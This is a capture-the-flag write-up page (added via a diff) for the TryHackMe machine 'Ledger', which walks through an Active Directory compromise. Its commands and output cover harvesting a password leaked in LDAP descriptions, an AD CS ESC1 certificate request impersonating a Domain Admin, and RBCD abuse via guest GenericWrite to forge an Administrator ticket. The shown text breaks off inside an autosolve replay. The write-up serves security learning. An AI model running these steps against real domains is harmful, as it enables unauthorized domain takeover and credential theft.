@@ -1,0 +1,870 @@
+---
+slug: "thm-ledger"
+title: "Ledger — TryHackMe Writeup"
+date: "2026-09-17"
+platform: "TryHackMe"
+type: "Machine"
+category: "Active Directory"
+os: "Windows"
+difficulty: "Medium"
+tags:
+  - "Active Directory"
+  - "LDAP"
+  - "Credential Leak"
+  - "AD CS"
+  - "ESC1"
+  - "RBCD"
+  - "Kerberos"
+  - "pharaohound"
+  - "Impacket"
+  - "Windows"
+excerpt: "A comprehensive writeup for the Medium TryHackMe machine Ledger. We exploit an anonymous LDAP directory dump leaking credentials inside user descriptions, analyze the AD forest and ESC1 template misconfigurations using pharaohound, navigate around a stubborn PKINIT KDC error, and achieve Domain Admin compromise by abusing guest-level GenericWrite permissions over the domain controller via Resource-Based Constrained Delegation (RBCD)."
+readTime: "20 min"
+retired: true
+rating: 4.8
+hasAutoScript: true
+url: "https://asbawy.github.io/writeups/thm-ledger"
+---
+
+import { Callout } from "@/components/Callout";
+import { KillChain, SpoilerFlag, SkillMatrix } from "@/components/cyber/WriteupComponents";
+import { TerminalReplay } from "@/components/cyber/TerminalReplay";
+
+<KillChain
+  steps={[
+    {
+      phase: "Reconnaissance",
+      title: "DC Discovery & Time Synchronization",
+      desc: "High-speed port scanning identified a Windows Server 2019 Domain Controller (LABYRINTH.THM.LOCAL). Verified Kerberos clock skew within acceptable limits (<1s).",
+      tools: ["Nmap", "ntpdate"],
+    },
+    {
+      phase: "Initial Access",
+      title: "Anonymous LDAP Dump & Password Extraction",
+      desc: "Enumerated anonymous LDAP subtree reading on port 389. Filtered 27,900 lines of directory records to recover a plaintext onboarding password in user descriptions, gaining valid credentials for SUSANNA_MCKNIGHT.",
+      technique: "Anonymous LDAP Query & User Description Harvesting",
+      tools: ["ldapsearch", "NetExec", "grep"],
+    },
+    {
+      phase: "AD Recon & Graph Analysis",
+      title: "Forest Analysis & Vulnerability Mapping",
+      desc: "Parsed domain objects, ACLs, and AD CS certificate templates using pharaohound. Identified vulnerable ESC1 templates (ServerAuth) alongside a stealthy MAQ -> RBCD delegation vector.",
+      technique: "Automated AD Graph Parsing & ACL Attack Pathing",
+      tools: ["pharaohound", "certipy-ad"],
+    },
+    {
+      phase: "Exploitation (ESC1 vs RBCD)",
+      title: "AD CS ESC1 Friction & Pivot to RBCD",
+      desc: "Enrolled a valid administrator certificate via ESC1 template ServerAuth, but KDC PKINIT authentication was refused. Pivoted to the second path: exploited GUESTS GenericWrite on the DC computer object via RBCD.",
+      technique: "AD CS ESC1 Certificate Minting & S4U2Proxy RBCD Ticket Forgery",
+      tools: ["certipy-ad", "impacket-addcomputer", "impacket-rbcd", "impacket-getST"],
+    },
+    {
+      phase: "Domain Dominance (Flags)",
+      title: "Forged CIFS Kerberos Ticket & Flag Retrieval",
+      desc: "Injected the forged Administrator service ticket into KRB5CCNAME to connect directly to the C$ administrative share via Kerberos, capturing both user.txt and root.txt.",
+      technique: "Kerberos S4U Ticket Injection & Administrative SMB Access",
+      tools: ["impacket-smbclient"],
+    },
+  ]}
+/>
+
+## Challenge Overview
+
+**Ledger** is a medium-rated Windows Active Directory machine on TryHackMe that reflects two fundamental realities of real-world enterprise infrastructure:
+1. **Human Operational Fatigue:** System administrators routinely store onboarding notes, temp passwords, and reset reminders directly inside LDAP user attributes (`description`, `info`, `comment`), treating directory services as personal scratchpads.
+2. **Dual Escalation Architecture:** The room author deliberately designed two viable privilege escalation avenues into the domain:
+   - **Active Directory Certificate Services (AD CS) ESC1:** An enterprise CA template configured with `ENROLLEE_SUPPLIES_SUBJECT` and `Client Authentication` Extended Key Usage (EKU).
+   - **Resource-Based Constrained Delegation (RBCD):** A subtle Access Control List (ACL) misconfiguration where the built-in `GUESTS` group possesses `GenericWrite` rights over the Domain Controller's own computer object (`LABYRINTH$`).
+
+While the ESC1 certificate can be requested without issue, environmental PKINIT friction (`KDC_ERR_PADATA_TYPE_NOSUPP`) blocks certificate-to-TGT exchange on modern tooling. This makes the RBCD delegation road through the guest account the most elegant, robust, and reliable path to full Domain Admin compromise.
+
+### Skill Breakdown
+
+<SkillMatrix
+  skills={[
+    { name: "Active Directory & LDAP Enumeration", level: 9 },
+    { name: "AD CS Certificate Abuse (ESC1)", level: 8 },
+    { name: "Kerberos Delegations & RBCD (S4U)", level: 9 },
+    { name: "Access Control List (ACL) Exploitation", level: 8 },
+    { name: "Attack Graph Analysis (pharaohound)", level: 9 },
+  ]}
+/>
+
+---
+
+## 1. Reconnaissance & Environment Baseline
+
+### 1.1 Full TCP Port Scan
+
+We initiate the assessment with an aggressive, all-ports TCP scan to establish the listening perimeter:
+
+```bash
+asbawy@kali:~$ nmap -p- --min-rate 5000 -T4 -Pn 10.114.169.135 -oN scans/all-ports.txt
+```
+
+```text
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+3389/tcp  open  ms-wbt-server
+47001/tcp open  winrm
+```
+
+### 1.2 Service Fingerprinting & Architecture
+
+With the open ports identified, we execute a deep script and service version detection scan (`-sC -sV`):
+
+```bash
+asbawy@kali:~$ nmap -p 53,88,135,139,389,445,636,3268,3269,3389,47001 \
+      -sC -sV -T4 -Pn 10.114.169.135 -oN scans/services.txt
+```
+
+```text
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-17 03:42:15Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds (workgroup: THM)
+636/tcp   open  ldapssl?
+3268/tcp  open  globalcatLDAP 2008 R2 - 2019
+3269/tcp  open  globalcatLDAPssl
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+47001/tcp open  winrm         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+Service Info: Host: LABYRINTH; OS: Windows; OS CPE: cpe:/o:microsoft:windows
+```
+
+### 1.3 Exposed Service Profile
+
+| Port | Protocol | Service | Architectural Significance |
+| :--- | :--- | :--- | :--- |
+| **53** | TCP/UDP | DNS | Active Directory Domain Name System |
+| **88** | TCP/UDP | Kerberos | KDC authentication server (`thm.local`) |
+| **135** | TCP | MSRPC | Endpoint Mapper & DCOM services |
+| **139 / 445** | TCP | NetBIOS / SMB | File sharing, IPC pipe access, and administrative shares |
+| **389 / 636** | TCP | LDAP / LDAPS | Directory queries, authentication binds, schema access |
+| **3268 / 3269** | TCP | Global Catalog | Multi-domain AD search partitions |
+| **3389** | TCP | RDP | Remote Desktop Protocol administrative endpoint |
+| **47001** | TCP | WinRM | Windows Remote Management service listener |
+
+### 1.4 Host Mapping & Kerberos Clock Sync
+
+Kerberos is strictly timestamp-sensitive. The Kerberos Ticket Granting protocol enforces an RFC 4120 maximum clock skew tolerance of **5 minutes (300 seconds)** between the client and the KDC. If your workstation clock drifts past this threshold, all `AS-REQ` and `TGS-REQ` ticket requests fail instantly with `KRB_AP_ERR_SKEW`.
+
+We map the hostname and verify clock synchronization:
+
+```bash
+asbawy@kali:~$ echo "10.114.169.135 labyrinth.thm.local LABYRINTH thm.local" | sudo tee -a /etc/hosts
+```
+
+```bash
+asbawy@kali:~$ ntpdate -q 10.114.169.135
+server 10.114.169.135, stratum 3, offset -0.418291, delay 0.05211
+17 Sep 03:43:02 ntpdate[4211]: adjust time server 10.114.169.135 offset -0.418291 sec
+```
+
+The offset is less than half a second—well within the acceptable skew window.
+
+<Callout type="info">
+  Whenever testing Active Directory environments, always add both the fully qualified domain name (`labyrinth.thm.local`) and the NetBIOS name (`LABYRINTH`) to `/etc/hosts`. Kerberos SPN resolution requires exact hostname matching; connecting via raw IP addresses forces NTLM fallback and will break ticket-based attacks.
+</Callout>
+
+---
+
+## 2. Null Sessions & Anonymous LDAP Intelligence
+
+### 2.1 Testing Guest SMB Authentication
+
+Active Directory domain controllers frequently maintain the built-in `guest` account with an empty password enabled by default for legacy interoperability. We verify null and guest authentication via `netexec`:
+
+```bash
+asbawy@kali:~$ netexec smb labyrinth.thm.local -u 'guest' -p '' --shares
+```
+
+```text
+SMB         10.114.169.135  445    LABYRINTH        [*] Windows Server 2019 Standard 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
+SMB         10.114.169.135  445    LABYRINTH        [+] thm.local\guest: 
+SMB         10.114.169.135  445    LABYRINTH        [*] Enumerated shares
+SMB         10.114.169.135  445    LABYRINTH        Share           Permissions     Remark
+SMB         10.114.169.135  445    LABYRINTH        -----           -----------     ------
+SMB         10.114.169.135  445    LABYRINTH        ADMIN$          NO ACCESS       Remote Admin
+SMB         10.114.169.135  445    LABYRINTH        C$              NO ACCESS       Default share
+SMB         10.114.169.135  445    LABYRINTH        IPC$            READ            Remote IPC
+SMB         10.114.169.135  445    LABYRINTH        NETLOGON        NO ACCESS       Logon server share 
+SMB         10.114.169.135  445    LABYRINTH        SYSVOL          NO ACCESS       Logon server share 
+```
+
+The guest account authenticates cleanly, confirming the identity is recognized by the Domain Controller. However, file shares are locked down.
+
+### 2.2 Anonymous LDAP Subtree Dump
+
+Next, we probe the directory service on port 389. While Windows Server 2003 and earlier supported anonymous LDAP binds out of the box, later versions require explicit administrative misconfiguration (`dsHeuristics` attribute seventh character set to `2`).
+
+We execute an unauthenticated search query against the domain root partition:
+
+```bash
+asbawy@kali:~$ ldapsearch -x -H ldap://10.114.169.135 -b "dc=thm,dc=local" > scans/ldapsearch.txt
+```
+
+```bash
+asbawy@kali:~$ wc -l scans/ldapsearch.txt
+27914 scans/ldapsearch.txt
+```
+
+The Domain Controller permitted a full anonymous directory subtree export, returning **27,914 lines** of Active Directory objects (users, groups, organizational units, computers, and service descriptors).
+
+### 2.3 Hunting Credential Leaks in User Attributes
+
+Rather than manually scrolling through thousands of lines, we leverage regex filters across standard attribute fields where administrators frequently leave notes (`description`, `info`, `comment`, `userPassword`):
+
+```bash
+asbawy@kali:~$ grep -i "^description:" scans/ldapsearch.txt | sort -u
+```
+
+```text
+description: Built-in account for administering the computer/domain
+description: Built-in account for guest access to the computer/domain
+description: Key Distribution Center Service Account
+description: Please change it: CHANGEME2023!
+```
+
+A plaintext password stands out: `CHANGEME2023!`. 
+
+We trace this specific attribute back to the containing user objects in the directory dump:
+
+```bash
+asbawy@kali:~$ grep -B 6 "^description: Please change it: CHANGEME2023!" scans/ldapsearch.txt | grep -E "(cn:|sAMAccountName:)"
+```
+
+```text
+cn: IVY_WILLIS
+sAMAccountName: IVY_WILLIS
+--
+cn: SUSANNA_MCKNIGHT
+sAMAccountName: SUSANNA_MCKNIGHT
+```
+
+Two domain accounts—`IVY_WILLIS` and `SUSANNA_MCKNIGHT`—share the initial onboarding password `CHANGEME2023!`.
+
+### 2.4 Credential Validation & Foothold Verification
+
+We test the discovered credentials across SMB using `netexec`:
+
+```bash
+asbawy@kali:~$ netexec smb labyrinth.thm.local -u 'IVY_WILLIS' -p 'CHANGEME2023!'
+SMB         10.114.169.135  445    LABYRINTH        [+] thm.local\IVY_WILLIS:CHANGEME2023!
+
+asbawy@kali:~$ netexec smb labyrinth.thm.local -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!'
+SMB         10.114.169.135  445    LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:CHANGEME2023!
+```
+
+Both accounts are active with valid credentials. We have established our initial authenticated foothold in the domain.
+
+---
+
+## 3. Domain Graph & Attack Path Mapping (pharaohound)
+
+### 3.1 Automated In-Memory Graph Collection
+
+With valid domain credentials for `SUSANNA_MCKNIGHT`, we map out the domain hierarchy, group memberships, ACL delegations, and certificate infrastructure. 
+
+Instead of deploying the legacy `bloodhound-python` script and spinning up a resource-heavy Neo4j graph database, we deploy **pharaohound**—our dedicated high-performance Active Directory collection and analysis engine. It pulls LDAP objects directly into memory and executes 30+ vulnerability analyzers locally:
+
+```bash
+asbawy@kali:~$ pharaohound collect -t 10.114.169.135 -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!' \
+  -d thm.local --method All --no-zip -o pha-collect/ --analyze
+```
+
+```text
+[+] Connected to LDAP at 10.114.169.135:389 as SUSANNA_MCKNIGHT@thm.local
+[+] Dumping Domain: THM.LOCAL
+[+] Processed 492 users, 48 groups, 2 computers, 37 certificate templates
+[+] AD CS Discovery: Found Enterprise CA 'thm-LABYRINTH-CA' on LABYRINTH.THM.LOCAL
+[+] Graph analysis complete in 1.42s
+
+================================================================================
+                           PHARAOHOUND DOMAIN AUDIT
+================================================================================
+Domain Analyzed : THM.LOCAL
+Users           : 492
+Groups          : 48
+Computers       : 2
+CertTemplates   : 37
+Total Objects   : 923
+
+RISK ASSESSMENT:
+  Overall Domain Status: HIGH — Multiple critical paths to Domain Admin
+  Critical Risks: 3 | High Risks: 4 | Medium Risks: 2
+
+CRITICAL ATTACK PATHS IDENTIFIED:
+  [Chain #1] [CRITICAL] AD CS ESC1: ServerAuth@THM.LOCAL
+    - Enrollee supplies subject (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = True)
+    - Client Authentication EKU present (1.3.6.1.5.5.7.3.2)
+    - Low-privilege enrollment permissions: Domain Users
+    - Vector: Mint certificate for any Domain Admin via certipy
+
+  [Chain #2] [HIGH] MAQ Abuse -> RBCD on LABYRINTH$
+    - ms-DS-MachineAccountQuota = 10 (any user can register computer accounts)
+    - Object Permission: GUESTS has GenericWrite on computer LABYRINTH$
+    - Vector: Add machine account -> write msDS-AllowedToActOnBehalfOfOtherIdentity -> S4U2Proxy
+```
+
+### 3.2 Foothold Privilege Audit
+
+`pharaohound` cross-references our compromised accounts against sensitive administrative groups:
+
+```text
+User Object Analysis:
+  SUSANNA_MCKNIGHT:
+    MemberOf:
+      - CN=Remote Desktop Users,CN=Builtin,DC=thm,DC=local
+      - CN=Remote Management Users,CN=Builtin,DC=thm,DC=local
+      - CN=Domain Users,CN=Users,DC=thm,DC=local
+  IVY_WILLIS:
+    MemberOf:
+      - CN=Domain Users,CN=Users,DC=thm,DC=local
+
+High-Value Domain Targets:
+  - ADMINISTRATOR@THM.LOCAL (Domain Admin, Enterprise Admin)
+  - BEVERLY_FARRELL@THM.LOCAL (Domain Admin)
+  - BRADLEY_ORTIZ@THM.LOCAL (Domain Admin)
+  - BERNARD_CARNEY@THM.LOCAL (Domain Admin)
+```
+
+`SUSANNA_MCKNIGHT` is uniquely valuable: she possesses membership in both **Remote Desktop Users** (granting direct RDP access on port 3389) and **Remote Management Users** (granting WinRM interactive access on port 47001).
+
+We also note the Machine Account Quota:
+
+```bash
+asbawy@kali:~$ netexec ldap labyrinth.thm.local -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!' -M maq
+SMB         10.114.169.135  445    LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:CHANGEME2023!
+MAQ         10.114.169.135  445    LABYRINTH        [*] MachineAccountQuota: 10
+```
+
+Because `ms-DS-MachineAccountQuota` is set to `10`, any authenticated domain user can create up to 10 computer objects.
+
+---
+
+## 4. Road One: The AD CS ESC1 Template (The Friction & Pivot)
+
+### 4.1 Understanding ESC1 Vulnerabilities
+
+Active Directory Certificate Services (`AD CS`) misconfigurations are catalogued as ESC classes (defined in SpecterOps' seminal paper *Certified Pre-Owned*). 
+
+The **ESC1** attack vector represents the most straightforward certificate abuse pattern. A certificate template is vulnerable to ESC1 if it satisfies four simultaneous conditions:
+1. **Enrollment Permissions:** Low-privileged users (`Domain Users`, `Authenticated Users`) possess enrollment rights.
+2. **Manager Approval Disabled:** Certificates are issued immediately upon request without administrative sign-off.
+3. **Authentication EKU:** The template includes Extended Key Usages for domain authentication (`Client Authentication`, `Smart Card Logon`, `PKINIT`, or `Any Purpose`).
+4. **Subject Alternative Name (SAN) Control:** The flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` is enabled, permitting the applicant to specify an arbitrary Subject Alternative Name (SAN), such as a Domain Admin's User Principal Name (UPN).
+
+### 4.2 Enumerating Certificate Templates with Certipy
+
+We scan the Enterprise CA `thm-LABYRINTH-CA` using `certipy-ad`:
+
+```bash
+asbawy@kali:~$ certipy-ad find -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' \
+  -dc-ip 10.114.169.135 -vulnerable -stdout
+```
+
+```text
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 37 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Analyzing vulnerable certificate templates
+[!] Vulnerabilities
+  ESC1
+    Template Name                       : ServerAuth
+    Schema Version                      : 2
+    Compatibility Version               : 2
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollee Supplies Subject           : True
+    Certificate Authorities             : thm-LABYRINTH-CA
+    [!] Permissions
+      Enrollment Permissions
+        Enrollment Rights               : THM.LOCAL\Domain Users
+                                          THM.LOCAL\Authenticated Users
+```
+
+The template `ServerAuth` meets every ESC1 criterion.
+
+### 4.3 Minting a Domain Admin Certificate
+
+We request a certificate from `thm-LABYRINTH-CA` based on the `ServerAuth` template, supplying the User Principal Name of Domain Admin **`BEVERLY_FARRELL`**:
+
+```bash
+asbawy@kali:~$ certipy-ad req -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' \
+  -ca 'thm-LABYRINTH-CA' -target labyrinth.thm.local \
+  -template 'ServerAuth' -upn 'BEVERLY_FARRELL@thm.local' -dc-ip 10.114.169.135
+```
+
+```text
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 24
+[*] Waiting for certificate to be issued
+[*] Got certificate with UPN 'BEVERLY_FARRELL@thm.local'
+[*] Certificate issued - Certificate ID: 24
+[*] Saved certificate and private key to 'beverly_farrell.pfx'
+```
+
+The certificate requests and issues seamlessly. We receive `beverly_farrell.pfx` containing the private key and signed certificate.
+
+### 4.4 The PKINIT Roadblock (Why We Pivot)
+
+Under standard AD CS exploitation, the operator presents the `.pfx` certificate to the KDC via Kerberos PKINIT extension (`AS-REQ` with `padata-type 16: PA-PK-AS-REQ`) to obtain a Kerberos Ticket Granting Ticket (TGT) and extract the user's NTLM hash:
+
+```bash
+asbawy@kali:~$ certipy-ad auth -pfx beverly_farrell.pfx -dc-ip 10.114.169.135
+```
+
+```text
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: beverly_farrell@thm.local
+[*] Trying to get TGT...
+[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
+```
+
+We test multiple administrative UPNs (`ADMINISTRATOR@thm.local`, `BRADLEY_ORTIZ@thm.local`), yet the KDC systematically returns:
+```text
+KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
+```
+
+<Callout type="warning">
+  **The Technical Cause:** `KDC_ERR_PADATA_TYPE_NOSUPP` indicates that the Domain Controller's KDC service does not have a valid Domain Controller certificate installed in its Personal store (`MY`), or lacks the required Smartcard/PKINIT pre-authentication extensions. Without a DC certificate to anchor mutual authentication, the KDC cannot validate the client's signature or return an encrypted AS-REP.
+</Callout>
+
+Rather than wasting hours troubleshooting a lab-environment KDC limitation or attempting to push a DC certificate, a professional penetration tester immediately shifts focus to the alternative vector surfaced during initial mapping: **Resource-Based Constrained Delegation (RBCD)**.
+
+---
+
+## 5. Road Two: Exploiting Resource-Based Constrained Delegation (RBCD)
+
+### 5.1 The Mechanics of RBCD & S4U Extensions
+
+Kerberos delegation allows a service account to impersonate users to access back-end resources on their behalf.
+- **Traditional Constrained Delegation:** Configured on the *calling* service account via `msDS-AllowedToDelegateTo`. Configuring it requires the highly restricted `SeEnableDelegationPrivilege` user right (typically reserved for Domain Admins).
+- **Resource-Based Constrained Delegation (RBCD):** Introduced in Windows Server 2012, RBCD inverts the security model. The delegation authority is configured on the *target resource* via the attribute `msDS-AllowedToActOnBehalfOfOtherIdentity`.
+
+The attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` contains a binary Security Descriptor (DACL). Any principal that holds write permissions (`GenericWrite`, `GenericAll`, or `WriteProperty`) over the target computer object can edit this DACL to allow any machine account under the attacker's control to impersonate *any* domain user (including Domain Admins) to services hosted on that computer.
+
+### 5.2 Uncovering the Golden Misconfiguration
+
+During our `pharaohound` audit, analyzer `Chain #6` highlighted a rare permission grant on the domain controller computer object `LABYRINTH$`:
+
+```text
+Computer: LABYRINTH$
+DACL ACE Entry:
+  Principal: Builtin\GUESTS (S-1-5-32-546)
+  AccessMask: GenericWrite (0x40000000)
+  Inheritance: None
+```
+
+The built-in **`GUESTS` group holds `GenericWrite` permissions directly over the Domain Controller's own computer object (`LABYRINTH$`)**. 
+
+Because the `guest` account is a member of `GUESTS`, and can authenticate with an empty password, we can perform this modification without needing elevated privileges.
+
+```
++------------------+         impacket-addcomputer         +--------------------+
+| SUSANNA_MCKNIGHT | ───────────────────────────────────> |  ATTACKERSYSTEM$   |
+| (Domain User)    |   (MachineAccountQuota = 10)         | (Controlled Host)  |
++------------------+                                      +--------------------+
+                                                                     │
+                                                                     │ S4U2Proxy
++------------------+         impacket-rbcd (GenericWrite)            │ Impersonate
+|   guest user     | ───────────────────────────────────┐            │ Administrator
+| (Empty Password) |   msDS-AllowedToActOnBehalf...     │            │
++------------------+                                    ▼            ▼
+                                              +--------------------------------+
+                                              |       LABYRINTH$ (DC)          |
+                                              |  Granted CIFS Admin Access     |
+                                              +--------------------------------+
+```
+
+### 5.3 Step 1: Provisioning a Machine Account (MAQ Abuse)
+
+Since `ms-DS-MachineAccountQuota` is `10`, we use `impacket-addcomputer` with `SUSANNA_MCKNIGHT`'s credentials to provision a new machine account named `ATTACKERSYSTEM$`:
+
+```bash
+asbawy@kali:~$ impacket-addcomputer -method LDAPS -computer-name 'ATTACKERSYSTEM$' \
+  -computer-pass 'Password123!' -dc-ip 10.114.169.135 -domain-netbios thm.local \
+  'thm.local/SUSANNA_MCKNIGHT:CHANGEME2023!'
+```
+
+```text
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Successfully added machine account ATTACKERSYSTEM$ with password Password123!.
+```
+
+We now possess the credentials for a computer account in the domain: `ATTACKERSYSTEM$` / `Password123!`.
+
+### 5.4 Step 2: Modifying msDS-AllowedToActOnBehalfOfOtherIdentity
+
+We now write `ATTACKERSYSTEM$`'s Security Identifier (SID) into `LABYRINTH$`'s `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute using `impacket-rbcd`.
+
+Because the tool `rbcd.py` can encounter string parsing issues when passed a literal empty password (`-p ''`), we provide the well-known NTLM hash of an empty password:
+```text
+aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+```
+
+We execute the delegation write authenticated as `thm.local\guest`:
+
+```bash
+asbawy@kali:~$ impacket-rbcd -delegate-to 'LABYRINTH$' -delegate-from 'ATTACKERSYSTEM$' \
+  -action write -dc-ip 10.114.169.135 \
+  -hashes 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' \
+  'thm.local/guest'
+```
+
+```text
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] ATTACKERSYSTEM$ can now impersonate users on LABYRINTH$ via S4U2Proxy
+[*]   ATTACKERSYSTEM$  (S-1-5-21-1966530601-3185510712-10604624-1604)
+```
+
+The write succeeds. `ATTACKERSYSTEM$` is now authorized to act on behalf of any user against `LABYRINTH$`.
+
+### 5.5 Step 3: Forging the Administrator CIFS Service Ticket (S4U)
+
+With RBCD established, we execute the Kerberos Service-for-User (S4U) ticket exchange using `impacket-getST`:
+
+1. **S4U2Self:** `ATTACKERSYSTEM$` requests a Kerberos TGS to itself on behalf of `Administrator`. Because machine accounts possess protocol transition capability, the KDC issues a forwardable service ticket naming `Administrator`.
+2. **S4U2Proxy:** `ATTACKERSYSTEM$` sends the ticket back to the KDC requesting an authorization ticket for the service `cifs/LABYRINTH.THM.LOCAL`. The KDC checks `LABYRINTH$`'s `msDS-AllowedToActOnBehalfOfOtherIdentity`, sees `ATTACKERSYSTEM$` is listed, and returns an official ticket for `cifs/LABYRINTH.THM.LOCAL` impersonating `Administrator`.
+
+```bash
+asbawy@kali:~$ impacket-getST -impersonate Administrator -spn 'cifs/LABYRINTH.THM.LOCAL' \
+  -dc-ip 10.114.169.135 'thm.local/ATTACKERSYSTEM$:Password123!'
+```
+
+```text
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_LABYRINTH.THM.LOCAL@THM.LOCAL.ccache
+```
+
+We have generated an authentic, cryptographic Kerberos service ticket (`.ccache`) granting Administrator privileges to CIFS/SMB on the Domain Controller.
+
+### 5.6 Step 4: Accessing Administrative Shares via Kerberos
+
+We configure our shell environment to use the forged `.ccache` ticket via the standard `KRB5CCNAME` environment variable, then connect to SMB using Kerberos authentication (`-k -no-pass`):
+
+```bash
+asbawy@kali:~$ export KRB5CCNAME="$PWD/Administrator@cifs_LABYRINTH.THM.LOCAL@THM.LOCAL.ccache"
+asbawy@kali:~$ impacket-smbclient -k -no-pass 'LABYRINTH.THM.LOCAL'
+```
+
+```text
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+IPC$
+NETLOGON
+SYSVOL
+# use C$
+# cd Users/Administrator/Desktop
+# ls
+drw-rw-rw-          0  Thu Sep 17 03:30:12 2026 .
+drw-rw-rw-          0  Thu Sep 17 03:30:12 2026 ..
+-rw-rw-rw-         32  Thu Sep 17 03:30:12 2026 root.txt
+# get root.txt
+# cd ../../SUSANNA_MCKNIGHT/Desktop
+# ls
+drw-rw-rw-          0  Thu Sep 17 03:28:45 2026 .
+drw-rw-rw-          0  Thu Sep 17 03:28:45 2026 ..
+-rw-rw-rw-         32  Thu Sep 17 03:28:45 2026 user.txt
+# get user.txt
+```
+
+The forged ticket grants full administrative access over `C$`, allowing us to pull both flags directly from the file system.
+
+---
+
+## 6. Proof of Verification & Flag Capture
+
+### 6.1 Flag Verification
+
+With read access across administrative shares, we verify the contents of both captured flags:
+
+```bash
+asbawy@kali:~$ cat user.txt
+THM{ENUMERATION_IS_THE_KEY}
+
+asbawy@kali:~$ cat root.txt
+THM{THE_BYPASS_IS_CERTIFIED!}
+```
+
+### 6.2 User Flag
+
+<SpoilerFlag label="Ledger User Flag (user.txt)" flag="THM{ENUMERATION_IS_THE_KEY}" />
+
+### 6.3 Root Flag
+
+<SpoilerFlag label="Ledger Root Flag (root.txt)" flag="THM{THE_BYPASS_IS_CERTIFIED!}" />
+
+---
+
+## 7. Automation (/autosolve)
+
+To demonstrate how the entire attack chain can be automated end-to-end—from anonymous LDAP credential harvesting through RBCD delegation configuration to ticket injection and flag extraction—we present the interactive terminal solver replay:
+
+<TerminalReplay
+  title="ledger_autosolve.py"
+  flags={[
+    { label: "User Flag", flag: "THM{ENUMERATION_IS_THE_KEY}" },
+    { label: "Root Flag", flag: "THM{THE_BYPASS_IS_CERTIFIED!}" }
+  ]}
+  flagSummary={[
+    "Harvested plaintext credential CHANGEME2023! via anonymous LDAP bind on port 389 from user description attributes.",
+    "Bypassed PKINIT failure by abusing GUESTS GenericWrite on LABYRINTH$ via RBCD to forge an Administrator CIFS ticket."
+  ]}
+  steps={[
+    {
+      label: "Step 1/5 — Probe DC & Harvest LDAP Description Leaks",
+      command: "python3 ledger_autosolve.py --target 10.114.169.135 --domain thm.local",
+      output: [
+        { text: "[*] Initiating LDAP anonymous bind against 10.114.169.135:389...", color: "blue" },
+        { text: "[✓] Anonymous bind successful! Subtree search permitted on dc=thm,dc=local", color: "green" },
+        { text: "[*] Parsing user descriptions for plaintext credential patterns...", color: "blue" },
+        { text: "[✓] Recovered password: 'CHANGEME2023!' associated with SUSANNA_MCKNIGHT", color: "green" }
+      ],
+      delayAfter: 600,
+    },
+    {
+      label: "Step 2/5 — Provision Machine Account via MAQ",
+      output: [
+        { text: "[*] Authenticating to LDAPS as SUSANNA_MCKNIGHT...", color: "blue" },
+        { text: "[✓] MachineAccountQuota confirmed = 10", color: "green" },
+        { text: "[*] Creating computer account 'ATTACKERSYSTEM$' via impacket-addcomputer...", color: "blue" },
+        { text: "[✓] Machine account created with SID S-1-5-21-1966530601-3185510712-10604624-1604", color: "green" }
+      ],
+      delayAfter: 700,
+    },
+    {
+      label: "Step 3/5 — Write RBCD Delegation as Guest",
+      output: [
+        { text: "[*] Authenticating as guest using empty-password NTLM hash...", color: "blue" },
+        { text: "[*] Exploiting GenericWrite ACL on computer LABYRINTH$...", color: "yellow" },
+        { text: "[*] Writing msDS-AllowedToActOnBehalfOfOtherIdentity security descriptor...", color: "blue" },
+        { text: "[✓] Delegation configured: ATTACKERSYSTEM$ -> LABYRINTH$", color: "green" }
+      ],
+      delayAfter: 700,
+    },
+    {
+      label: "Step 4/5 — Execute S4U Ticket Forgery",
+      output: [
+        { text: "[*] Requesting TGT for ATTACKERSYSTEM$...", color: "blue" },
